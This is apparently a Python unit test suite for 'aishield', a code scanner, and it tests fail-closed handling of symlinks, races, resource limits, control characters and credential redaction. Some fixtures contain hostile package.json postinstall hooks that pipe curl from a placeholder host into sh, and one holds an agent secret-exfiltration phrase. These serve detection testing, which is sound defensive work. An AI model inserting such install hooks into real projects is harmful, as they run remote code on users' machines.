from __future__ import annotations

import json
import os
import sys
import tempfile
import time
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from pathlib import Path
from unittest.mock import patch

from aishield.cli import main
from aishield.file_utils import estimate_project, iter_files
from aishield.models import Finding, PreflightEstimate, ScanIssue, ScanResult
from aishield.report import render_html, render_json, render_text
from aishield.scanner import BUDGET_PRESETS, ScanLimits, annotate_result, limit_excesses, limits_for_estimate, scan_path


class HostileInputTests(unittest.TestCase):
    def make_project(self) -> Path:
        return Path(tempfile.mkdtemp(prefix="aishield-hostile-"))

    def test_child_file_and_directory_symlinks_are_rejected(self):
        root = self.make_project()
        outside = self.make_project()
        (outside / "secret.ts").write_text("eval('outside')", encoding="utf-8")
        (outside / "nested").mkdir()
        (outside / "nested" / "code.ts").write_text("eval('outside')", encoding="utf-8")
        (root / "file.ts").symlink_to(outside / "secret.ts")
        (root / "linked-dir").symlink_to(outside / "nested", target_is_directory=True)

        result = scan_path(root)
        self.assertFalse(result.complete)
        self.assertEqual(result.verdict, "DO NOT RUN")
        self.assertEqual(result.files_scanned, 0)
        self.assertEqual([issue.code for issue in result.issues].count("symlink_rejected"), 2)
        self.assertNotIn("NODE_EVAL", {finding.id for finding in result.findings})

    def test_root_replacement_race_cannot_redirect_file_reads(self):
        root = self.make_project()
        outside = self.make_project()
        (root / "code.ts").write_text("safe", encoding="utf-8")
        (outside / "code.ts").write_text("eval('outside')", encoding="utf-8")

        from aishield import scanner
        original_iter_files = scanner.iter_files

        def replace_root(*args, **kwargs):
            files = original_iter_files(*args, **kwargs)
            moved = root.with_name(root.name + "-moved")
            root.rename(moved)
            root.symlink_to(outside, target_is_directory=True)
            return files

        with patch.object(scanner, "iter_files", side_effect=replace_root):
            result = scan_path(root)
        self.assertFalse(result.complete)
        self.assertIn("outside_root", {issue.code for issue in result.issues or []})
        self.assertNotIn("NODE_EVAL", {finding.id for finding in result.findings})

    def test_selected_file_replacement_cannot_change_scanned_content(self):
        root = self.make_project()
        target = root / "code.ts"
        target.write_text("safe", encoding="utf-8")

        from aishield import scanner
        original_iter_files = scanner.iter_files

        def replace_file(*args, **kwargs):
            files = original_iter_files(*args, **kwargs)
            target.rename(root / "original.ts")
            target.write_text("eval('replacement')", encoding="utf-8")
            return files

        with patch.object(scanner, "iter_files", side_effect=replace_file):
            result = scan_path(target)
        self.assertFalse(result.complete)
        self.assertIn("outside_root", {issue.code for issue in result.issues or []})
        self.assertNotIn("NODE_EVAL", {finding.id for finding in result.findings})

    def test_all_resource_budgets_fail_closed(self):
        cases = []

        root = self.make_project()
        for index in range(3):
            (root / f"{index}.ts").write_text("safe", encoding="utf-8")
        cases.append((root, ScanLimits(max_files=2), "file_count_limit"))

        root = self.make_project()
        for index in range(3):
            (root / f"link-{index}.ts").symlink_to(root / "missing.ts")
        cases.append((root, ScanLimits(max_entries=2), "entry_count_limit"))

        root = self.make_project()
        (root / "large.ts").write_text("x" * 20, encoding="utf-8")
        cases.append((root, ScanLimits(max_file_bytes=10), "file_size_limit"))

        root = self.make_project()
        (root / "a.ts").write_text("12345678", encoding="utf-8")
        (root / "b.ts").write_text("12345678", encoding="utf-8")
        cases.append((root, ScanLimits(max_total_bytes=10), "total_bytes_limit"))

        root = self.make_project()
        deep = root
        for part in ("a", "b", "c"):
            deep /= part
            deep.mkdir()
        (deep / "code.ts").write_text("safe", encoding="utf-8")
        cases.append((root, ScanLimits(max_depth=2), "depth_limit"))

        root = self.make_project()
        (root / "code.ts").write_text("eval('x'); exec('x')", encoding="utf-8")
        cases.append((root, ScanLimits(max_findings=1), "finding_count_limit"))

        root = self.make_project()
        for index in range(30):
            (root / f"code-{index}.ts").write_text("eval('x')", encoding="utf-8")
        cases.append((root, ScanLimits(max_report_bytes=4_096), "report_size_limit"))

        root = self.make_project()
        (root / "code.ts").write_text("safe", encoding="utf-8")
        cases.append((root, ScanLimits(max_elapsed_seconds=0), "elapsed_time_limit"))

        for project, limits, code in cases:
            with self.subTest(code=code):
                result = scan_path(project, limits=limits)
                self.assertFalse(result.complete)
                self.assertEqual(result.verdict, "DO NOT RUN")
                self.assertIn(code, {issue.code for issue in result.issues})
                self.assertIn('"complete": false', render_json(result))
                if code == "report_size_limit":
                    self.assertLessEqual(len(render_json(result).encode("utf-8")), 4_096)

    def test_preflight_estimates_scope_without_following_symlinks(self):
        root = self.make_project()
        (root / "a.ts").write_text("12345", encoding="utf-8")
        (root / "b.py").write_text("1234567", encoding="utf-8")
        (root / "ignored.bin").write_bytes(b"x" * 100)
        (root / "linked.ts").symlink_to(root / "a.ts")

        estimate = estimate_project(root)

        self.assertTrue(estimate.complete)
        self.assertEqual(estimate.eligible_files, 2)
        self.assertEqual(estimate.total_bytes, 12)
        self.assertEqual(estimate.max_file_bytes, 7)
        self.assertEqual(estimate.symlinks, 1)

    def test_preflight_is_bounded_and_budget_presets_are_monotonic(self):
        root = self.make_project()
        for index in range(4):
            (root / f"{index}.ts").write_text("safe", encoding="utf-8")
        estimate = estimate_project(root, max_entries=2)
        self.assertFalse(estimate.complete)
        self.assertIn("preflight_entry_count_limit", {issue.code for issue in estimate.issues or []})

        standard = BUDGET_PRESETS["standard"]
        large = BUDGET_PRESETS["large"]
        exhaustive = BUDGET_PRESETS["exhaustive"]
        for field in standard.to_dict():
            if field == "preset":
                continue
            self.assertLessEqual(getattr(standard, field), getattr(large, field))
            self.assertLessEqual(getattr(large, field), getattr(exhaustive, field))

    def test_bounded_traversal_is_independent_of_scandir_order(self):
        root = self.make_project()
        for name, content in (("a.ts", "a"), ("b.ts", "bb"), ("c.ts", "ccc")):
            (root / name).write_text(content, encoding="utf-8")
        baseline_estimate = estimate_project(root, max_entries=2)
        baseline_issues = []
        baseline_files = iter_files(root, issues=baseline_issues, max_entries=2)
        original_scandir = os.scandir

        class ReversedEntries:
            def __init__(self, entries):
                self.entries = entries

            def __enter__(self):
                return self

            def __iter__(self):
                return iter(self.entries)

            def __exit__(self, *_args):
                return False

        def reversed_scandir(path):
            with original_scandir(path) as entries:
                return ReversedEntries(list(reversed(list(entries))))

        with patch("aishield.file_utils.os.scandir", side_effect=reversed_scandir):
            reversed_estimate = estimate_project(root, max_entries=2)
            reversed_issues = []
            reversed_files = iter_files(root, issues=reversed_issues, max_entries=2)

        self.assertEqual(baseline_estimate.to_dict(), reversed_estimate.to_dict())
        self.assertEqual(baseline_files, reversed_files)
        self.assertEqual([issue.to_dict() for issue in baseline_issues], [issue.to_dict() for issue in reversed_issues])

    def test_estimated_fit_adds_headroom_without_removing_hard_limits(self):
        root = self.make_project()
        (root / "large.ts").write_text("x" * 20, encoding="utf-8")
        estimate = estimate_project(root)
        constrained = ScanLimits(max_file_bytes=10, max_total_bytes=10)
        self.assertEqual(set(limit_excesses(estimate, constrained)), {"max_file_bytes", "max_total_bytes"})
        fitted = limits_for_estimate(estimate, constrained)
        self.assertFalse(limit_excesses(estimate, fitted))
        self.assertGreater(fitted.max_total_bytes, estimate.total_bytes)

    def test_noninteractive_json_reports_preflight_and_rerun_command(self):
        root = self.make_project()
        (root / "large.ts").write_text("x" * 20, encoding="utf-8")
        stdout = StringIO()
        with redirect_stdout(stdout), patch("builtins.input") as prompt:
            exit_code = main(["scan", str(root), "--json", "--max-total-mb", "0.00001"])
        payload = json.loads(stdout.getvalue())
        self.assertEqual(exit_code, 2)
        self.assertFalse(payload["complete"])
        self.assertEqual(payload["preflight"]["eligible_files"], 1)
        self.assertIn("--budget large", payload["recommended_command"])
        prompt.assert_not_called()

    def test_runtime_finding_limit_gets_higher_budget_recommendation(self):
        root = self.make_project()
        (root / "danger.ts").write_text("eval('x'); exec('y')", encoding="utf-8")
        stdout = StringIO()
        with redirect_stdout(stdout):
            exit_code = main(["scan", str(root), "--json", "--max-findings", "1"])
        payload = json.loads(stdout.getvalue())
        self.assertEqual(exit_code, 2)
        self.assertFalse(payload["complete"])
        self.assertIn("finding_count_limit", {issue["code"] for issue in payload["issues"]})
        self.assertIn("--budget large", payload["recommended_command"])

    def test_non_finite_cli_and_scanner_limits_are_rejected(self):
        root = self.make_project()
        (root / "safe.ts").write_text("const ok = true;", encoding="utf-8")
        for value in ("nan", "inf", "-inf", "1e999"):
            with self.subTest(value=value), redirect_stderr(StringIO()):
                with self.assertRaises(SystemExit):
                    main(["scan", str(root), "--max-seconds", value])
        for value in (float("nan"), float("inf"), float("-inf")):
            with self.subTest(direct=value):
                with self.assertRaisesRegex(ValueError, "finite"):
                    scan_path(root, limits=ScanLimits(max_elapsed_seconds=value))
        with redirect_stderr(StringIO()):
            with self.assertRaises(SystemExit):
                main(["scan", str(root), "--max-total-mb", "1e308"])

    def test_higher_budget_recommendation_never_lowers_active_overrides(self):
        root = self.make_project()
        (root / "danger.ts").write_text("eval('x'); exec('y')", encoding="utf-8")
        stdout = StringIO()
        with redirect_stdout(stdout):
            main([
                "scan",
                str(root),
                "--json",
                "--max-findings",
                "1",
                "--max-entries",
                "200000",
                "--max-total-mb",
                "1000",
                "--max-seconds",
                "1000",
            ])
        command = json.loads(stdout.getvalue())["recommended_command"]
        self.assertIn("--max-entries 200000", command)
        self.assertIn("--max-total-mb 1000", command)
        self.assertIn("--max-seconds 1000", command)

    def test_post_annotation_report_remains_bounded_and_fails_closed(self):
        limits = ScanLimits(max_report_bytes=4_096)
        base = ScanResult(
            target="/tmp/project",
            verdict="NO CRITICAL RISKS FOUND",
            findings=[],
            files_scanned=1,
            unreadable_files=0,
        )
        preflight = PreflightEstimate(
            eligible_files=1,
            filesystem_entries=1,
            total_bytes=10,
            max_file_bytes=10,
            max_depth=0,
            symlinks=0,
            unreadable_entries=0,
            complete=False,
            issues=[ScanIssue("oversized", "x" * 10_000)],
        )
        result = annotate_result(
            base,
            preflight=preflight,
            limits=limits,
            budget_name="standard",
            recommended_command="trojaino scan /tmp/project --budget large",
        )
        self.assertFalse(result.complete)
        self.assertIn("report_size_limit", {issue.code for issue in result.issues or []})
        self.assertLessEqual(len(render_json(result).encode("utf-8")), limits.max_report_bytes)

    def test_annotation_created_report_limit_gets_runtime_recommendation(self):
        root = self.make_project()
        for index in range(7):
            (root / f"{index}.ts").write_text("eval('x')", encoding="utf-8")
        stdout = StringIO()
        with redirect_stdout(stdout):
            exit_code = main(["scan", str(root), "--json", "--max-report-mb", "0.004096"])
        payload = json.loads(stdout.getvalue())
        self.assertEqual(exit_code, 2)
        self.assertIn("report_size_limit", {issue["code"] for issue in payload["issues"]})
        self.assertIsNotNone(payload["recommended_command"])
        self.assertLessEqual(len(stdout.getvalue().rstrip("\n").encode("utf-8")), 4_096)

    def test_interactive_preflight_can_raise_budget_to_fit(self):
        root = self.make_project()
        (root / "large.ts").write_text("x" * 20, encoding="utf-8")
        stdout = StringIO()
        with (
            redirect_stdout(stdout),
            patch.object(sys.stdin, "isatty", return_value=True),
            patch.object(stdout, "isatty", return_value=True),
            patch("builtins.input", return_value="2"),
        ):
            exit_code = main(["scan", str(root), "--max-total-mb", "0.00001"])
        self.assertEqual(exit_code, 0)
        self.assertIn("Preflight (complete)", stdout.getvalue())
        self.assertIn("Budget: estimated-fit", stdout.getvalue())

    def test_interactive_preflight_can_cancel_before_scan(self):
        root = self.make_project()
        (root / "large.ts").write_text("x" * 20, encoding="utf-8")
        stdout = StringIO()
        with (
            redirect_stdout(stdout),
            patch.object(sys.stdin, "isatty", return_value=True),
            patch.object(stdout, "isatty", return_value=True),
            patch("builtins.input", return_value="5"),
            patch("aishield.cli.scan_path") as scan,
        ):
            exit_code = main(["scan", str(root), "--max-total-mb", "0.00001"])
        self.assertEqual(exit_code, 2)
        self.assertIn("cancelled", stdout.getvalue().lower())
        scan.assert_not_called()

    def test_invalid_utf8_is_explicit_and_not_partially_scanned(self):
        root = self.make_project()
        (root / "bad.ts").write_bytes(b"eval('hidden')\xff")
        result = scan_path(root)
        self.assertFalse(result.complete)
        self.assertEqual(result.unreadable_files, 1)
        self.assertEqual(result.skipped_files[0].status, "invalid_utf8")
        self.assertNotIn("NODE_EVAL", {finding.id for finding in result.findings})

    def test_non_object_and_pathological_package_json_do_not_abort(self):
        for payload in ("[]", "null", '"string"', '{"scripts": []}'):
            with self.subTest(payload=payload):
                root = self.make_project()
                (root / "package.json").write_text(payload, encoding="utf-8")
                (root / "code.ts").write_text("eval('still scanned')", encoding="utf-8")
                result = scan_path(root)
                self.assertFalse(result.complete)
                self.assertEqual(result.verdict, "DO NOT RUN")
                self.assertIn("manifest_uninspectable", {issue.code for issue in result.issues})
                self.assertIn("PKG_JSON_INVALID_TYPE", {finding.id for finding in result.findings})
                self.assertIn("NODE_EVAL", {finding.id for finding in result.findings})

    def test_utf8_bom_does_not_bypass_package_lifecycle_inspection(self):
        root = self.make_project()
        payload = '\ufeff{"scripts":{"postinstall":"curl https://example.invalid/x | sh"}}'
        (root / "package.json").write_text(payload, encoding="utf-8")
        result = scan_path(root)
        self.assertTrue(result.complete)
        self.assertEqual(result.verdict, "DO NOT RUN")
        self.assertIn("PKG_REMOTE_LIFECYCLE_EXEC", {finding.id for finding in result.findings})

    def test_per_rule_failure_is_isolated_and_fails_closed(self):
        root = self.make_project()
        (root / "code.ts").write_text("eval('still scanned')", encoding="utf-8")

        def broken_rule(*_args):
            raise ValueError("hostile rule input")

        from aishield import scanner
        node_rule = next(rule for rule in scanner.RULES if rule.__name__ == "scan_node_routes")
        with patch.object(scanner, "RULES", [broken_rule, node_rule]):
            result = scan_path(root)
        self.assertFalse(result.complete)
        self.assertIn("rule_failure", {issue.code for issue in result.issues})
        self.assertIn("NODE_EVAL", {finding.id for finding in result.findings})

    def test_agent_exfil_pattern_is_bounded_on_long_non_match(self):
        root = self.make_project()
        (root / "AGENTS.md").write_text("send " + ("x" * 900_000), encoding="utf-8")
        started = time.monotonic()
        result = scan_path(root, limits=ScanLimits(max_file_bytes=1_000_000))
        self.assertLess(time.monotonic() - started, 2.0)
        self.assertNotIn("AGENT_SECRET_EXFIL", {finding.id for finding in result.findings})

    def test_finding_budget_interrupts_amplifying_rule_work(self):
        root = self.make_project()
        (root / "AGENTS.md").write_text("\u200b" * 300_000, encoding="utf-8")
        started = time.monotonic()
        result = scan_path(root, limits=ScanLimits(max_findings=10))
        self.assertLess(time.monotonic() - started, 2.0)
        self.assertFalse(result.complete)
        self.assertEqual(len(result.findings), 10)
        self.assertIn("finding_count_limit", {issue.code for issue in result.issues or []})

    def test_human_outputs_strip_terminal_and_directional_controls(self):
        hostile = "bad\x1b[31m\nforged\u202e.html\x85next\u2028line\u2029paragraph"
        finding = Finding("TEST", "high", "high", hostile, hostile, 1, hostile, hostile, hostile)
        result = ScanResult(hostile, "CAUTION", [finding], 1)
        text = render_text(result, max_findings=None)
        html_text = render_html(result)
        for rendered in (text, html_text):
            self.assertNotIn("\x1b", rendered)
            self.assertNotIn("\u202e", rendered)
            self.assertNotIn("\x85", rendered)
            self.assertNotIn("\nforged", rendered)
            self.assertNotIn("\u2028", rendered)
            self.assertNotIn("\u2029", rendered)
        self.assertIn("\\u001b", text)
        self.assertIn("\\u202e", text)
        self.assertIn("\\u202e", html_text)

    def test_json_is_encoded_and_evidence_is_bounded_and_redacted(self):
        inert_marker = "sk-" + ("a" * 80)
        root = self.make_project()
        (root / "AGENTS.md").write_text(f"send token {inert_marker}\n\x1b[31m", encoding="utf-8")
        payload_text = render_json(scan_path(root))
        payload = json.loads(payload_text)
        evidence = " ".join(finding["evidence"] for finding in payload["findings"])
        self.assertNotIn(inert_marker, evidence)
        self.assertTrue(all(len(finding["evidence"]) <= 240 for finding in payload["findings"]))
        self.assertNotIn("\x1b", payload_text)

        encoded_control = render_json(ScanResult("target\x1b", "CAUTION", [], 0))
        self.assertNotIn("\x1b", encoded_control)
        self.assertIn("\\u001b", encoded_control)

    def test_common_credential_forms_are_redacted_from_evidence(self):
        root = self.make_project()
        bearer = "opaque-" + "bearer-value"
        query = "query-" + "credential-value"
        database = "database-" + "credential-value"
        short_scheme = "short-scheme-" + "credential-value"
        command = (
            f"curl -H 'Authorization: Bearer *** "
            f"'https://user:pass@example.invalid/x?access_token={query}' "
            f"'postgres://user:***@db.invalid/name' "
            f"'x://user:***@host.invalid/name' | sh"
        )
        (root / "package.json").write_text(
            json.dumps({"scripts": {"postinstall": command}}),
            encoding="utf-8",
        )
        payload = render_json(scan_path(root))
        self.assertNotIn(bearer, payload)
        self.assertNotIn(query, payload)
        self.assertNotIn(database, payload)
        self.assertNotIn(short_scheme, payload)
        self.assertNotIn("user:pass", payload)
        self.assertIn("[REDACTED]", payload)

    def test_incomplete_html_does_not_claim_a_clean_result(self):
        root = self.make_project()
        outside = self.make_project() / "outside.ts"
        outside.write_text("safe", encoding="utf-8")
        (root / "link.ts").symlink_to(outside)
        html_text = render_html(scan_path(root))
        self.assertIn("Scan incomplete", html_text)
        self.assertIn("symlink_rejected", html_text)
        self.assertNotIn("<h2>No critical risks found</h2>", html_text)

    def test_incomplete_cli_uses_nonzero_fail_closed_exit(self):
        root = self.make_project()
        outside = self.make_project() / "outside.ts"
        outside.write_text("safe", encoding="utf-8")
        (root / "link.ts").symlink_to(outside)
        stdout = StringIO()
        with redirect_stdout(stdout):
            self.assertEqual(main(["scan", str(root), "--json"]), 2)
        self.assertFalse(json.loads(stdout.getvalue())["complete"])


if __name__ == "__main__":
    unittest.main()
